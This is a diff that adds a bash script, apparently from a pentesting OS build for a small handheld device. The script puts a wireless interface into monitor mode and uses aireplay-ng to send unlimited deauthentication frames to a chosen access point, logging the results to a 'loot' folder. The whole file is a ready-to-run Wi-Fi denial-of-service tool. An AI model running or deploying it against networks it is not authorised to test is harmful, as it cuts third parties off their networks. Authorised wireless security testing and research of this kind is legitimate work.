@@ -1,0 +1,61 @@
+#!/bin/bash
+# /usr/local/bin/wifi-deauth
+# Monitor mode + deauth attack
+# Usage: wifi-deauth <iface> [bssid] [channel]
+
+IFACE="${1:-wlan0}"
+BSSID="$2"
+CHAN="$3"
+LOOT="/opt/cardputer/loot/recon"
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+
+if [ "$(id -u)" -ne 0 ]; then
+    echo "[!] Root required."
+    exit 1
+fi
+
+mkdir -p "$LOOT"
+
+if [ -z "$BSSID" ]; then
+    echo "[*] No target BSSID specified. Launching scan first..."
+    echo "[*] Find your target, then run:"
+    echo "    sudo wifi-deauth $IFACE <BSSID> <CHANNEL>"
+    echo ""
+    wifi-scan "$IFACE"
+    exit 0
+fi
+
+if [ -z "$CHAN" ]; then
+    echo "[!] Channel required for targeted deauth."
+    echo "    Usage: wifi-deauth $IFACE $BSSID <CHANNEL>"
+    exit 1
+fi
+
+echo "[*] ZERO-DAY OS — WiFi Deauth Attack"
+echo "[*] Target: $BSSID on channel $CHAN"
+echo ""
+
+IFTYPE=$(iw dev "$IFACE" info 2>/dev/null | awk '/type/{print $2}')
+if [ "$IFTYPE" != "monitor" ]; then
+    echo "[*] Setting $IFACE to monitor mode..."
+    ip link set "$IFACE" down
+    iw dev "$IFACE" set type monitor
+    ip link set "$IFACE" up
+    sleep 1
+fi
+
+iw dev "$IFACE" set channel "$CHAN"
+echo "[*] Interface $IFACE in monitor mode on channel $CHAN"
+echo "[*] Sending deauth frames to $BSSID..."
+echo "[*] Press Ctrl+C to stop"
+echo ""
+
+OUTFILE="$LOOT/deauth_${BSSID//:/}_ch${CHAN}_${TIMESTAMP}.log"
+
+aireplay-ng --deauth 0 -a "$BSSID" "$IFACE" 2>&1 | tee "$OUTFILE"
+
+echo ""
+echo "[*] Deauth stopped. Log: $OUTFILE"
+
+iw dev "$IFACE" set type managed 2>/dev/null
+ip link set "$IFACE" up 2>/dev/null
